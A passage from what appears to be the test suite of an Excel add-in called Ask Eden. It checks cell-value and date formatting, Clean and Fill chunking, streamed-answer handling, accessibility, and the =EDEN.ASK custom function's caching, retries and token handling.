  assert.deepEqual(X.blocks('a *b* c_d_ _e_ 2*3*4')[0].runs, [{ t: 'a ' }, { t: 'b', i: true }, { t: ' c_d_ ' }, { t: 'e', i: true }, { t: ' 2*3*4' }]);
  assert.deepEqual(X.blocks('*x* and *y*')[0].runs, [{ t: 'x', i: true }, { t: ' and ' }, { t: 'y', i: true }]);
  assert.doesNotMatch(read('taskpane.js'), /requestSubmit/, 'Safari 15 has no requestSubmit (R1X17)');
  // Every word the pane shows comes from STRINGS (French too, R1X13): t('key') keys all exist.
  for (const file of ['taskpane.js', 'functions.js', 'connect.js', 'connected.js']) {
    for (const [, key] of read(file).matchAll(/\bt\('([A-Za-z]+)'/g)) assert.ok(X.STRINGS.en[key] && X.STRINGS.fr[key], `${file}: ${key}`);
    assert.doesNotMatch(read(file), /note\(`|note\('[A-Z]|warn\('[A-Z]|res\.(warn|done|confirm) = `[A-Z]|fail\('[A-Z]/, `${file}: no English sentence outside STRINGS`);
  }
  const html = read('taskpane.html');
  for (const [, key] of html.matchAll(/data-i18n(?:-[a-z]+)?="([A-Za-z]+)"/g)) assert.ok(X.STRINGS.fr[key], `taskpane.html: ${key}`);
});

test('numbers go as their value, dates as shown; Clean never writes back a display rounding (R2X4)', () => {
  // With the number format: only a date or a time goes as shown text.
  assert.equal(X.cellOf(123456789, '1.2E+08', 'General'), 123456789);
  assert.equal(X.cellOf(1234567, '1.2M', '0.0,,"M"'), 1234567);
  assert.equal(X.cellOf(1234567, '1,235K', '#,##0,"K"'), 1234567);
  assert.equal(X.cellOf(0.5, '1/2', '# ?/?'), '1/2', 'a fraction shown exactly goes as shown (R3X1)');
  assert.equal(X.cellOf(0.3333, '1/3', '# ?/?'), 0.3333, 'a rounded fraction goes as its value');
  assert.equal(X.cellOf(0, '-', '_($* #,##0_);_($* (#,##0);_($* "-"??_);_(@_)'), 0);
  assert.equal(X.cellOf(45291.5729, '12/31/2023', 'm/d/yyyy'), '12/31/2023');
  assert.equal(X.cellOf(0.5, '12:00 PM', 'h:mm AM/PM'), '12:00 PM');
  assert.equal(X.cellOf(45291.75, '########', 'dd/mm/yyyy hh:mm'), '2023-12-31 18:00', 'a date shown as #### goes as ISO text');
  assert.equal(X.cellOf(45291, '########', '[$-409]d-mmm-yy;@'), '2023-12-31');
  assert.equal(X.cellOf(12, '########', 'General'), 12);
  assert.equal(X.cellOf(1.5, '36:00', '[h]:mm'), '36:00');
  assert.equal(X.cellOf(0.25, '25%', '0%'), '25%', 'a percentage keeps its unit (R3X1)');
  assert.equal(X.cellOf(3, '3', '"Red" 0'), 3, 'quoted text in a format isn’t a date part');
  // Without one (a cell function's quick read), a shown date still decides; a rounded number doesn't.
  assert.equal(X.cellOf(123456789, '1.2E+08'), 123456789);
  assert.equal(X.cellOf(1234567, '1.2M'), 1234567);
  assert.equal(X.cellOf(45291, '31.12.2023'), '31.12.2023');
  assert.deepEqual(X.gridOf([[123456789, 45291]], [['1.2E+08', '12/31/2023']], [['General', 'm/d/yyyy']]), [[123456789, '12/31/2023']]);
  assert.deepEqual(X.kindsOf([[1, 45291, 'a', true, '']], [['General', 'mmm d', '@', 'General', 'General']]), [['number', 'date', 'text', 'boolean', 'empty']]);
  assert.deepEqual(X.rawOf([[0.42, 'paris', 45291]], [['=RAND()', 'paris', 45291]]), [['=RAND()', 'paris', 45291]]);

  // Reading Eden's text back.
  assert.equal(X.numberOf('1,234,567'), 1234567);
  assert.equal(X.numberOf('1,234', { lang: 'fr' }), null);
  assert.equal(X.numberOf('50%'), 0.5);
  assert.equal(X.numberOf('1.2E+08'), 120000000);
  assert.equal(X.numberOf('n/a'), null);
  assert.deepEqual(X.dateOf('2023-12-31'), { day: 45291 });
  assert.deepEqual(X.dateOf('2023-12-31 13:45'), { day: 45291, time: (13 * 60 + 45) / 1440, seconds: false });
  assert.deepEqual(X.dateOf('12/31/2023', 'm/d/yyyy'), { day: 45291 });
  assert.deepEqual(X.dateOf('31/12/2023', 'dd/mm/yyyy'), { day: 45291 });
  assert.equal(X.dateOf('31/12/2023', 'm/d/yyyy'), null, 'no 31st month');
  assert.deepEqual(X.dateOf('1:45 PM'), { time: (13 * 60 + 45) / 1440, seconds: false });
  assert.equal(X.dateOf('Dec 31'), null);

  // Clean (BREAK N03): the sent cells are the values (and the date as shown); Eden's version is compared by value.
  const values = [[45291.5729166667, 1234567, 0, 99]];
  const formats = [['m/d/yyyy', '0.0,,"M"', '_(* #,##0_);_(* (#,##0);_(* "-"??_);_(@_)', 'General']];
  const kinds = X.kindsOf(values, formats);
  const sent = X.gridOf(values, [['12/31/2023', '1.2M', '-', '99']], formats);
  assert.deepEqual(sent, [['12/31/2023', 1234567, 0, 99]]);
  const opts = { kinds, raw: values, formats };
  // A reformat or a display rounding of the same day, or the number re-spelled: no change, nothing written.
  assert.deepEqual(X.cleanChanges(sent, [['2023-12-31', '1,234,567', '0', '99.0']], null, opts), []);
  // Another value (a rounding, another day, text, a blank): never written; the cell is left as it is, and counted.
  for (const answer of [['2024-01-02', '1200000', '', '98'], ['soon', '1.2M', 'zero', 'n/a']]) {
    const kept = X.cleanChanges(sent, [answer], null, opts);
    assert.deepEqual(kept, [], answer.join());
    assert.equal(kept.kept, 4);
  }
  // A date-time shown with its time: the same minute, however written, is the same; another minute is left alone.
  const dt = [[45291.5729166667]];
  const dtOpts = { kinds: [['date']], raw: dt, formats: [['yyyy-mm-dd hh:mm']] };
  assert.deepEqual(X.cleanChanges([['2023-12-31 13:45']], [['2023-12-31 13:45']], null, dtOpts), []);
  assert.equal(X.cleanChanges([['2023-12-31 13:45']], [['2023/12/31 13:45']], null, dtOpts).kept, 0);
  assert.equal(X.cleanChanges([['2023-12-31 13:45']], [['2023-12-31 14:00']], null, dtOpts).kept, 1);
  assert.equal(X.sameValue(45291.5729166667, '2023-12-31', 'date', 'm/d/yyyy'), true, 'a date-only view of a date-time is the same day');
  assert.equal(X.sameValue(1234567, '1234567.0', 'number'), true);
  // Text cells still clean as before; booleans by meaning.
  assert.deepEqual(X.cleanChanges([['paris ', true]], [['Paris', 'TRUE']], null, { kinds: [['text', 'boolean']] }), [{ r: 0, c: 0, from: 'paris ', to: 'Paris' }]);
});

test('Clean keeps line breaks and rows where they were (R2X3, R2X10, R2X12)', () => {
  // A multi-line cell whose only change is flattened line breaks or tabs isn't changed (R2X3).
  const cells = [['line one\nline two'], ['a\tb'], ['x\n y']];
  assert.deepEqual(X.cleanChanges(cells, [['line one line two'], ['a b'], ['x\ny']]), [{ r: 2, c: 0, from: 'x\n y', to: 'x\ny' }]);
  // BREAK N04: dropped line breaks plus another edit: the cell is left as it is (never flattened), and counted.
  const n04 = X.cleanChanges(cells, [['Line one line two'], ['a\tb'], ['x\n y']]);
  assert.deepEqual(n04, []);
  assert.equal(n04.kept, 1);
  assert.deepEqual(X.cleanChanges(cells, [['Line one\nline two'], ['a\tb'], ['x\n y']]), [{ r: 0, c: 0, from: 'line one\nline two', to: 'Line one\nline two' }]);
  // CRLF and lone CR cells come back with their own line breaks: an exact echo changes nothing (R2X10).
  const win = [['Note'], ['first\r\nsecond'], ['old\rmac'], ['mixed\r\nand\nlf']];
  const out = X.cleanSend(win);
  assert.deepEqual(out.escaped.map((r) => r[0]), [false, '\r\n', '\r', '\n']);
  const echo = out.values.map((r) => r.join('\t')).join('\n');
  const back = X.cleanReceive(X.cleanCheck(echo, out.values).rows, out.escaped);
  assert.deepEqual(back, [['Note'], ['first\r\nsecond'], ['old\rmac'], ['mixed\nand\nlf']]);
  assert.deepEqual(X.cleanChanges(win, back), [], 'BREAK N09: an exact echo changes nothing');
  const fixed = X.cleanReceive(X.cleanCheck('Note\nFirst\\nsecond\nold\\nmac\nmixed\\nand\\nlf', out.values).rows, out.escaped);
  assert.equal(fixed[1][0], 'First\r\nsecond');
  // BREAK N06: blank first row sent; the answer drops it and ends with a blank line: same count, no shift (R2X12).
  const sentRows = [[null], ['paris'], ['lyon']];
  assert.deepEqual(X.cleanCheck('Paris\nLyon\n\n', sentRows).rows, [[''], ['Paris'], ['Lyon']]);
  assert.deepEqual(X.cleanCheck('\nParis\nLyon', sentRows).rows, [[''], ['Paris'], ['Lyon']]);
  assert.deepEqual(X.cleanCheck('Paris\nLyon', sentRows).rows, [[''], ['Paris'], ['Lyon']]);
  assert.match(X.cleanCheck('Paris\n\nLyon\n', sentRows).error, /rows for 3/, 'a blank row inside the core doesn’t line up');
  const tail = [['paris'], ['lyon'], [null]];
  assert.deepEqual(X.cleanCheck('\nParis\nLyon', tail).rows, [['Paris'], ['Lyon'], ['']]);
});

test('Fill in parts sized by the server’s answer budget and 5,000 cells (R2X2, R2X5)', () => {
  assert.equal(X.LIMITS.fillTokens, SHEET.apps.excel.fillTokens);
  assert.equal(typeof serverSheets.fillTokens, 'function', 'the server’s fill budget (sheets.js fillTokens)');
  const desc = (i) => `Product ${i}: a hand-made ceramic mug with a speckled glaze, holds 350 ml, dishwasher safe, made in Portugal.`;
  const rows = Array.from({ length: 200 }, (_, i) => [desc(i), i % 2 ? 'é 中文 ✓' : null]);
  assert.equal(X.fillTokens(rows), serverSheets.fillTokens(rows.map((r) => r.map((c) => (c === null ? '' : String(c))))), 'the same formula as the server');
  // Short cells (categories): one part of 200 rows; sentence-length cells: smaller parts, each within the budget.
  assert.deepEqual(X.chunksFor('fill', Array.from({ length: 200 }, (_, i) => [`city ${i}`]), null).map((p) => p.end - p.start), [200]);
  const parts = X.chunksFor('fill', rows, null);
  assert.ok(parts.length > 1 && parts.length <= X.LIMITS.parts, `parts: ${parts.length}`);
  for (const p of parts) {
    const part = rows.slice(p.start, p.end);
    assert.ok(X.fillTokens(part) <= SHEET.apps.excel.fillTokens, `part ${p.start}: ${X.fillTokens(part)}`);
    const { body } = X.sheetBody({ action: 'fill', instruction: 'in French', sheet: { range: X.rangeName({ col: 0, row: 1 }, p.start, p.end - p.start, 2), values: part } });
    assert.doesNotThrow(() => parseSheet(body));
  }
  // A wide source next to an empty column: parts of at most 5,000 cells (BREAK N01: 200 rows × 30 columns).
  const wide = Array.from({ length: 200 }, (_, r) => Array.from({ length: 30 }, (_, c) => `v${r}x${c}`));
  const wp = X.chunksFor('fill', wide, null);
  assert.ok(wp.every((p) => (p.end - p.start) * 30 <= X.LIMITS.cells), JSON.stringify(wp));
  assert.equal(wp.at(-1).end, 200);
  // The privacy line says what Fill into an empty column sends, in both languages.
  assert.match(X.STRINGS.en.privacy, /Fill column into an empty column, the filled columns right next to it \(at most 10, on the same rows\)/);
  assert.match(X.STRINGS.fr.privacy, /Remplir la colonne dans une colonne vide, les colonnes remplies juste à côté \(10 au plus/);
  assert.equal(X.LIMITS.fillColumns, 10);
});

test('cuts: never half an emoji, counted as the server counts, marked with "…" (R2X7, R2X8)', () => {
  const cell = X.cellOf(`${'a'.repeat(1999)}😀b`);
  assert.ok(!/[\ud800-\udbff]$/.test(cell.replace(/…$/, '')), 'no lone surrogate');
  assert.ok(cell.endsWith('…'));
  assert.equal([...cell].length, 2000);
  assert.equal(X.cellOf('😀'.repeat(1500)), '😀'.repeat(1500), '1,500 emoji are 1,500 characters to the server');
  assert.equal(X.longCell([['😀'.repeat(1500)]]), null, 'Fill takes what the server takes');
  assert.deepEqual(X.longCell([['😀'.repeat(2001)]]), [0, 0]);
  const history = X.sheetBody({ action: 'ask', instruction: 'q', history: [{ role: 'user', text: `${'h'.repeat(7999)}😀😀` }] }).body.history[0].text;
  assert.ok(!/[\ud800-\udbff]…$/.test(history) && history.endsWith('…'));
  assert.equal(X.sheetBody({ action: 'ask', instruction: 'x'.repeat(2500) }).body.instruction.at(-1), '…');
  assert.ok(X.STRINGS.en.formulaTooLong && X.STRINGS.fr.formulaTooLong && X.STRINGS.fr.cfLong);
  const pane = read('taskpane.js');
  assert.match(pane, /if \(active\.formula && active\.formula\.length > X\.LIMITS\.cellChars\) return \{ error: t\('formulaTooLong'/, 'Explain refuses half a formula');
});

test('a streamed answer’s trailer: cut off, refused and dropped each get their own words (R2X13)', () => {
  assert.equal(X.TRAILER, serverAsk.TRAILER);
  assert.deepEqual(X.trailerOf('{"answer":"complete"}'), { complete: true });
  assert.deepEqual(X.trailerOf('{"answer":"cut"}'), { complete: true });
  assert.deepEqual(X.trailerOf(null), { broken: true }, 'no trailer: the connection dropped');
  assert.deepEqual(X.trailerOf('{"answ'), { broken: true });
  assert.deepEqual(X.trailerOf('{"status":502,"code":"upstream","error":"Claude stopped answering."}'), { broken: true });
  assert.deepEqual(X.trailerOf('{"status":504,"code":"too_slow","error":"x"}'), { timeout: true });
  const cut = X.trailerOf('{"status":413,"code":"cut_off","error":"The answer was too long."}');
  assert.equal(cut.status, 413);
  assert.match(X.errorWords(cut.status, cut.info.code, cut.info.error).words, /too long and was cut off/);
  const no = X.trailerOf('{"status":422,"code":"refused","error":"Eden declined this request. Try asking another way."}');
  assert.match(X.errorWords(no.status, no.info.code, no.info.error).words, /declined/);
  assert.match(X.errorWords(no.status, no.info.code, no.info.error, X.wordsFor('fr')).words, /décliné/);
  const pane = read('taskpane.js');
  assert.match(pane, /'x-eden-trailer': '1'/);
  // R3X4: split at U+0000 whatever the response headers say (a proxy may drop x-eden-trailer); no U+0000 is a break.
  assert.doesNotMatch(pane, /res\.headers\.get\('x-eden-trailer'\)/);
  assert.match(pane, /const at = text\.indexOf\(X\.TRAILER\);/);
  assert.doesNotMatch(pane, /if \(!trailed\) return;/);
  assert.match(pane, /const end = X\.trailerOf\(tail\);\s*if \(end\.complete\) return;/);
  assert.doesNotMatch(X.STRINGS.en.brokeOff, /too long/, 'a break is a break now');
});

test('formulas that reach outside the workbook: external names, INDIRECT to a file, CUBE (R2X17)', () => {
  assert.deepEqual(X.reachesOut('=Budget.xlsx!Total'), ['external link']);
  assert.deepEqual(X.reachesOut('=INDIRECT("[other.xlsx]Sheet1!A1")'), ['external link']);
  assert.deepEqual(X.reachesOut('=INDIRECT("\'C:\\\\data\\\\[x.xlsx]S\'!A1")'), ['external link']);
  assert.deepEqual(X.reachesOut('=CUBEVALUE("Sales","[Measures].[Total]")'), ['CUBE']);
  assert.deepEqual(X.reachesOut('=_xlfn.CUBEMEMBER("Sales","[Date]")'), ['CUBE']);
  assert.deepEqual(X.reachesOut('=INDIRECT("A"&ROW())'), [], 'INDIRECT inside the workbook is fine');
  assert.deepEqual(X.reachesOut('=Sheet1!A1+Totals!B2'), []);
  assert.deepEqual(X.reachesOut('=A1&"Budget.xlsx!Total"'), [], 'words inside text are fine');
});

test('the pane: Fill reads only the columns next to an empty column, checks values (not shown text), and resets "@" before a formula (R2X5, R2X6, R2X11, R2X15)', () => {
  const pane = read('taskpane.js');
  const fill = pane.slice(pane.indexOf("if (action === 'fill') {"), pane.indexOf('const sheet = { name, range: address, values };'));
  // The columns beside it (e2: besideOf, shared by the same-trip read and the one-at-a-time one).
  const beside = pane.slice(pane.indexOf('function besideOf('), pane.indexOf('async function cellsWith('));
  assert.match(beside, /const width = Math\.min\(X\.LIMITS\.fillColumns, dim\.columnIndex - used\.columnIndex\);/);
  assert.match(beside, /ws\.getRangeByIndexes\(dim\.rowIndex, dim\.columnIndex - width, dim\.rowCount, width\)/);
  assert.match(fill, /besideOf\(ws, dim, used\)/);
  assert.match(fill, /if \(filledAt\(width - 1 - n\)\) k = n \+ 1;\s*else if \(!hiddenCol \|\| !hiddenCol\[width - 1 - n\]\) break;/, 'stops at the first empty column shown');
  assert.doesNotMatch(pane, /getRangeByIndexes\((range|dim)\.rowIndex, used\.columnIndex/, 'never from the sheet’s first column');
  assert.match(pane, /'values,text,formulas,numberFormat'/, 'number formats come with the cells (R2X4)');
  assert.match(pane, /JSON\.stringify\(X\.rawOf\(source\.values, source\.formulas\)\) !== JSON\.stringify\(job\.raw\)/, 'Fill compares values and formulas');
  assert.match(pane, /const same = JSON\.stringify\(X\.rawOf\(source\.values, source\.formulas\)\) === JSON\.stringify\(job\.raw\);/, 'Clean too');
  assert.match(pane, /if \(target\.numberFormat && target\.numberFormat\[0\]\[0\] === '@'\) target\.numberFormat = \[\['General'\]\];\s*target\.formulas = \[\[res\.formula\]\];/);
  assert.match(pane, /let paneHidden = typeof document !== 'undefined' && document\.visibilityState === 'hidden';/);
  assert.match(pane, /if \(!paneHidden\) showSelection\(\);/);
});

test('accessibility: one live region, labelled icons, AA contrast, a footer that scrolls in a short pane', () => {
  const html = read('taskpane.html');
  assert.doesNotMatch(html, /<main id="log"[^>]*aria-live/, 'the log isn’t re-announced on every change (R1X14)');
  assert.match(html, /id="status" role="status"/);
  assert.match(html, /id="clear"[^>]*data-i18n-aria="clear"/, 'New chat has a label (R1X16)');
  assert.match(html, /<summary[^>]*data-i18n-aria="more"/);
  const pane = read('taskpane.js');
  assert.match(pane, /setAttribute\('aria-busy'/);
  assert.match(pane, /e\.key === 'Escape' && \$\('menu'\)\.open/, 'the ⋯ menu closes with Escape (R1X48)');
  assert.match(pane, /render\(\{ focus: reply \}\)/, 'focus lands on the result after Insert, Fill, Replace (R1X38)');
  // White text on the filled buttons and bubbles: at least 4.5:1, light and dark (R1X15).
  const css = read('taskpane.css');
  const lum = (hex) => {
    const [r, g, b] = hex.match(/[0-9a-f]{2}/gi).map((h) => parseInt(h, 16) / 255).map((c) => (c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4));
    return 0.2126 * r + 0.7152 * g + 0.0722 * b;
  };
  const ratio = (hex) => 1.05 / (lum(hex) + 0.05);
  for (const [, hex] of css.matchAll(/--(?:accent-fill|stop): (#[0-9a-f]{6})/gi)) assert.ok(ratio(hex) >= 4.5, `${hex}: ${ratio(hex).toFixed(2)}`);
  for (const rule of ['.turn.user', '.send', '.btn']) assert.match(css, new RegExp(`${rule.replace('.', '\\.')} \\{[^}]*background: var\\(--accent-fill\\)`), rule);
  assert.match(css, /footer \{[^}]*max-height: 58vh; overflow-y: auto;/, 'the footer scrolls at 350 × 500 (R1X37)');
});

// A fresh copy of the cell function (its own counters), with fetch faked by `answer(body, call)`. Like the
// real server's buffered answers, a 200 says `x-eden-answer: complete` unless it sets its own (or `x-test-bare`).
const asServer = (res) => {
  if (!res || res.status !== 200 || res.headers.has('x-eden-answer')) return res;
  if (res.headers.has('x-test-bare')) return new Response(res.body, { status: 200 });
  return new Response(res.body, { status: 200, headers: { 'x-eden-answer': 'complete' } });
};
function loadCells(answer) {
  const calls = [];
  let open = 0;
  const seen = { most: 0 };
  globalThis.fetch = async (url, init) => {
    const body = JSON.parse(init.body);
    const call = { url, body, auth: init.headers.authorization, headers: init.headers, signal: init.signal };
    calls.push(call);
    open += 1;
    seen.most = Math.max(seen.most, open);
    try {
      return asServer(await answer(body, call));
    } finally {
      open -= 1;
    }
  };
  delete globalThis.EdenPane;
  vm.runInThisContext(read('functions.js'), { filename: 'functions.js' });
  return { C: globalThis.EdenCells, calls, seen };
}
const one = (v) => [[v]]; // =EDEN.ASK's result: a 1 × 1 matrix
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

test('=EDEN.ASK: asks once per prompt + values, at most 2 at a time, stops at the session cap', async () => {
  const realFetch = globalThis.fetch;
  try {
    storage.map.clear();
    const { C, calls, seen } = loadCells(async (body) => {
      await wait(5);
      if (body.instruction === 'broke') return new Response(JSON.stringify({ error: 'No included AI is left on your Eden account.', code: 'no_allowance' }), { status: 402 });
      if (body.instruction === 'how many') return new Response('42\n', { status: 200 });
      return new Response(`answer to ${body.instruction}\n`, { status: 200 });
    });
    await assert.rejects(C.ask('Sum it', [[1], [2]]), /Connect Ask Eden first/);
    assert.equal(calls.length, 0);
    assert.equal(C.takeNeedConnect(), 1);

    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
    assert.deepEqual(await C.ask('Sum it', [[1], [2]]), one('answer to Sum it'));
    assert.equal(calls[0].url, '/api/eden/sheet');
    assert.equal(calls[0].auth, 'Bearer es1.acc.id.secret');
    assert.deepEqual(calls[0].body, { action: 'cell', app: 'excel', instruction: 'Sum it', sheet: { values: [[1], [2]] } });
    assert.equal(parseSheet(calls[0].body).action, 'cell');
    assert.deepEqual(await C.ask('Sum it', [[1], [2]]), one('answer to Sum it'));
    assert.equal(calls.length, 1, 'a recalculation doesn’t ask again');
    assert.deepEqual(await C.ask('Sum it', [['', '']]), one('answer to Sum it'));
    assert.equal(calls[1].body.sheet, undefined, 'an empty range sends no cells');
    assert.deepEqual(await C.ask('how many'), one(42), 'a plain number goes in as a number (R1X18)');

    await Promise.all(Array.from({ length: 12 }, (_, i) => C.ask(`q${i}`)));
    assert.ok(seen.most <= 2, `at most 2 at once, the server's limit per account (saw ${seen.most})`);
    const before = C.state().used;
    await assert.rejects(C.ask('broke'), /See your plan/);
    assert.equal(C.state().used, before, 'a failed ask doesn’t use up the cap (R1X22)');
    await assert.rejects(C.ask(''), /Type a question/);

    C.allowMore(0);
    await assert.rejects(C.ask('one more'), /paused after/);
    assert.equal(C.state().paused, 1);
    assert.deepEqual(await C.ask('q3'), one('answer to q3'), 'saved answers still come back at the cap');
    let recalcs = 0;
    globalThis.EdenPane = { recalc: () => (recalcs += 1) };
    C.allowMore(5);
    assert.equal(recalcs, 1, 'Allow more works the paused cells out again (R1X22)');
    assert.equal(C.state().paused, 0);
    assert.deepEqual(await C.ask('one more'), one('answer to one more'));
    assert.ok(C.clearSaved() >= 13);
  } finally {
    globalThis.fetch = realFetch;
    delete globalThis.EdenPane;
    storage.map.clear();
  }
});

test('=EDEN.ASK: whole columns trimmed, errors and dates as text, blank answers and broken streams never kept', async () => {
  const realFetch = globalThis.fetch;
  const realExcel = globalThis.Excel;
  try {
    storage.map.clear();
    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
    let next = [];
    const { C, calls } = loadCells(async () => {
      const r = next.shift();
      if (r === 'cutAnswer') return new Response('half (cut off)', { status: 200, headers: { 'x-eden-answer': 'cut' } });
      if (r === 'timeout504') return new Response(JSON.stringify({ code: 'too_slow', error: 'Eden took too long.' }), { status: 504 });
      if (r === 'break') return new Response(new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode('par')); c.error(new Error('cut_off')); } }), { status: 200 });
      return new Response(r ?? 'ok', { status: 200 });
    });
    // A whole column (1,048,576 rows, 10 with data) is trimmed to its data (R1X12).
    const column = Array.from({ length: 1048576 }, (_, i) => [i < 10 ? i + 1 : '']);
    assert.deepEqual(await C.ask('Sum it', column), one('ok'));
    assert.equal(calls.at(-1).body.sheet.values.length, 10);
    await assert.rejects(C.ask('Too much', Array.from({ length: 6000 }, (_, i) => [i])), /smaller range/);
    // An error in the range goes as its code (functions.json allowErrorForDataTypeAny, R1X21).
    await C.ask('Errors?', [[1], [{ code: '#N/A' }]]);
    assert.deepEqual(calls.at(-1).body.sheet.values, [[1], ['#N/A']]);
    // Dates: the range's shown text, read through its address (R1X11).
    globalThis.Excel = {
      run: async (fn) => fn({
        workbook: { worksheets: { getItem: (name) => ({ getRange: (cells) => ({ getCell: () => ({ getResizedRange: (r, c) => ({ load() {}, values: [[45291], [45292]], text: [['12/31/2023'], ['1/1/2024']], seen: { name, cells, r, c } }) }) }) }) } },
        sync: async () => {},
      }),
    };
    await C.ask('Which month?', [[45291], [45292]], { parameterAddresses: ['Sales!Z1', "'My sales'!C2:C3"] });
    assert.deepEqual(calls.at(-1).body.sheet.values, [['12/31/2023'], ['1/1/2024']]);
    // When Excel can't say (busy, or no address), the values go as they are.
    globalThis.Excel = { run: () => new Promise(() => {}) };
    C.timing.readMs = 20;
    await C.ask('Which day?', [[45293]], { parameterAddresses: ['Z1', 'C2'] });
    assert.deepEqual(calls.at(-1).body.sheet.values, [[45293]]);
    // A blank answer isn't kept (R1X20); neither is a broken (cut off) one.
    next = ['', 'fixed now'];
    await assert.rejects(C.ask('Blank?'), /no answer/);
    assert.deepEqual(await C.ask('Blank?'), one('fixed now'), 'asked again: the blank wasn’t kept');
    next = ['break', 'whole'];
    await assert.rejects(C.ask('Cut?'), /broke off/);
    assert.deepEqual(await C.ask('Cut?'), one('whole'));
    // Cell asks are buffered: the whole answer or a JSON error; a "cut" one never goes in a cell.
    assert.equal(calls.at(-1).headers['x-eden-buffer'], '1');
    next = ['cutAnswer', 'whole again'];
    await assert.rejects(C.ask('Cut 2?'), /broke off/);
    assert.deepEqual(await C.ask('Cut 2?'), one('whole again'));
    next = ['timeout504'];
    await assert.rejects(C.ask('Slow?'), /too long/);
    // Blank answers already saved by an older version are ignored too.
    X.cachePut(undefined, X.cacheKey('old', null), 'x');
    storage.setItem(X.cacheKey('old', null), JSON.stringify({ v: '', at: Date.now() }));
    assert.equal(X.cacheGet(undefined, X.cacheKey('old', null)), null);
  } finally {
    globalThis.fetch = realFetch;
    globalThis.Excel = realExcel;
    storage.map.clear();
  }
});

test('=EDEN.ASK: only Eden’s complete answer goes in a cell and is kept; a long question is refused; numbers as values (R2X4, R2X8, R2X9)', async () => {
  const realFetch = globalThis.fetch;
  const realExcel = globalThis.Excel;
  try {
    storage.map.clear();
    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
    let next = [];
    const { C, calls } = loadCells(async () => {
      const r = next.shift();
      if (r === 'html') return new Response('<!doctype html><title>Just a moment...</title>', { status: 200, headers: { 'x-test-bare': '1', 'content-type': 'text/html' } });
      return new Response(r ?? 'ok', { status: 200 });
    });
    // BREAK N07: a 200 that isn't Eden's answer (no x-eden-answer) is neither shown nor saved.
    next = ['html', 'real'];
    await assert.rejects(C.ask('total?', [[1], [2]]), /broke off/);
    assert.equal(C.state().saved, 0);
    assert.deepEqual(await C.ask('total?', [[1], [2]]), one('real'));
    // BREAK N08: a question over 2,000 characters is refused in words, never cut.
    const before = calls.length;
    await assert.rejects(C.ask('Summarize '.repeat(250), [[1]]), /shorter question: at most 2,000/);
    assert.equal(calls.length, before);
    assert.deepEqual(await C.ask(`${'q'.repeat(1999)}😀`, [[1]]), one('ok'), '2,000 characters (an emoji is one) are fine');
    // The range read through its address: big numbers go as their values, dates as shown (number formats).
    globalThis.Excel = {
      run: async (fn) => fn({
        workbook: { worksheets: { getItem: () => ({ getRange: () => ({ getCell: () => ({ getResizedRange: () => ({ load() {}, values: [[123456789], [45291]], text: [['1.2E+08'], ['12/31/2023']], numberFormat: [['General'], ['m/d/yyyy']] }) }) }) }) } },
        sync: async () => {},
      }),
    };
    await C.ask('Which?', [[123456789], [45291]], { parameterAddresses: ['Z1', 'Data!A1:A2'] });
    assert.deepEqual(calls.at(-1).body.sheet.values, [[123456789], ['12/31/2023']]);
  } finally {
    globalThis.fetch = realFetch;
    globalThis.Excel = realExcel;
    storage.map.clear();
  }
});

test('=EDEN.ASK: waits out "busy" (Retry-After), times out a stuck answer, and a stale 401 keeps a newer token', async () => {
  const realFetch = globalThis.fetch;
  try {
    storage.map.clear();
    X.saveToken(undefined, { access_token: 'es1.acc.old.secret', expires_in: 3600 });
    let mode = 'busy';
    const { C, calls } = loadCells(async (body, call) => {
      if (mode === 'busy') {
        mode = 'ok';
        return new Response(JSON.stringify({ code: 'slow_down' }), { status: 429, headers: { 'retry-after': '0' } });
      }
      if (body.instruction === 'stuck') return new Promise((_, no) => call.signal.addEventListener('abort', () => no(new DOMException('aborted', 'AbortError'))));
      if (body.instruction === 'late401') {
        await wait(30);
        return new Response(JSON.stringify({ code: 'not_connected' }), { status: 401 });
      }
      return new Response('fine', { status: 200 });
    });
    assert.deepEqual(await C.ask('hello'), one('fine'));
    assert.equal(calls.length, 2, 'a 429 is retried after its Retry-After');
    // Stuck answers end with an error and free their place (R1X32).
    C.timing.timeoutMs = 40;
    const stuck = [C.ask('stuck', [[1]]), C.ask('stuck', [[2]]), C.ask('stuck', [[3]])];
    for (const p of stuck) await assert.rejects(p, /too long/);
    assert.deepEqual(await C.ask('after'), one('fine'), 'the places came free');
    assert.equal(C.state().running, 0);
    C.timing.timeoutMs = 90_000;
    // A 401 for the old token while a new one was saved: the new one stays (R1X31).
    const late = C.ask('late401');
    await wait(5);
    X.saveToken(undefined, { access_token: 'es1.acc.new.secret', expires_in: 3600 });
    await assert.rejects(late, /Connect Ask Eden/);
    assert.equal(X.readToken(), 'es1.acc.new.secret');
    // …and with the pane: signedOut is told which token failed.
    const told = [];
    globalThis.EdenPane = { token: () => 'es1.acc.new.secret', signedOut: (used) => told.push(used) };
    await assert.rejects(C.ask('late401', [[9]]), /Connect Ask Eden/);
    assert.deepEqual(told, ['es1.acc.new.secret']);
  } finally {
    globalThis.fetch = realFetch;
    delete globalThis.EdenPane;
    storage.map.clear();
  }
});

test('=EDEN.ASK: the pane’s counter is told once per turn, with the latest numbers, however many cells change it', async () => {
  const realFetch = globalThis.fetch;
  try {
    storage.map.clear();
    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
    const { C } = loadCells(async () => new Response('ok', { status: 200 }));
    const told = [];
    C.onChange((s) => told.push(s));
    await Promise.all(Array.from({ length: 20 }, (_, i) => C.ask(`burst ${i}`)));
    await wait(10);
    assert.ok(told.length >= 1 && told.length < 20, `told ${told.length} times for 20 cells`);
    assert.deepEqual([told.at(-1).used, told.at(-1).saved, told.at(-1).running], [20, 20, 0], 'the last word is the current state');
    C.clearSaved();
    await wait(10);
    assert.equal(told.at(-1).saved, 0);
  } finally {
    globalThis.fetch = realFetch;
    storage.map.clear();
  }
});

test('percentages, money and fractions reach Eden in their unit, exactly; Clean still never writes a number (R3X1)', async () => {
  // Shown exactly: as shown (the person's own unit and spelling).
  assert.equal(X.cellOf(0.05, '5%', '0%'), '5%');
  assert.equal(X.cellOf(1.25, '125%', '0%'), '125%');
  assert.equal(X.cellOf(0.05, '5 %', '0 %'), '5 %');
